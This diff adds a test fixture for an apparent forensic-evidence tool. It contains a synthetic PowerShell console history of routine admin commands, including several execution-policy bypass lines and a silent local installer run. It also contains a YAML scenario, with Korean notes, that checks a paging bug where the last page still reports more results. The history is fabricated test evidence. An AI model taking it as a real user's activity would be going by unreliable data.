+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Resolve-DnsName update.corp.example -Type A
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Get-Process | Sort-Object CPU -Descending | Select-Object -First 15
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-Process | Sort-Object CPU -Descending | Select-Object -First 15
+      Get-LocalGroupMember -Group Administrators
+      Get-ChildItem -Path C:\Users\jlee\Downloads -Recurse | Select-Object FullName, Length
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Start-Process msiexec.exe -ArgumentList '/i C:\Temp\setup.msi /qn' -Wait
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Get-Service -Name Spooler | Restart-Service -Force
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Get-Service -Name Spooler | Restart-Service -Force
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-Process | Sort-Object CPU -Descending | Select-Object -First 15
+
+steps:
+  - tool: scan_evidence
+    note_ko: "준비: 사건 만들기"
+    args:
+      evidence_path: ${EVIDENCE}
+      case_id: psreadline-history
+  - tool: run_strings
+    note_ko: "준비: 기록 파일 적재"
+    args:
+      target_path: ${EVIDENCE}/C/Users/jlee/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
+  - tool: get_raw_output
+    note_ko: "준비: 첫 쪽(window 1·2)"
+    args:
+      source_name: strings.output
+      limit: 2
+  - tool: get_raw_output
+    note_ko: "준비: 둘째 쪽(window 3·4)"
+    args:
+      source_name: strings.output
+      after_id: 2
+      limit: 2
+  - tool: get_raw_output
+    note_ko: "결함 호출: 마지막 쪽(window 5·6)"
+    args:
+      source_name: strings.output
+      after_id: 4
+      limit: 2
+  - tool: get_raw_output
+    note_ko: "비교 호출: 마지막 쪽이 준 커서로 이어 읽기"
+    args:
+      source_name: strings.output
+      after_id: 6
+      limit: 2
+expect:
+  - step: 5
+    note_ko: "마지막 window 6까지 받았는데 `has_more`가 참이다"
+    regex: '"total_windows": 6,\s*"returned_windows": 2,\s*"next_after_id": 6,\s*"has_more": true'
+  - step: 6
+    note_ko: "그 커서로 이어 읽으면 window가 하나도 없다"
+    regex: '"returned_windows": 0,\s*"next_after_id": 6,\s*"has_more": false'
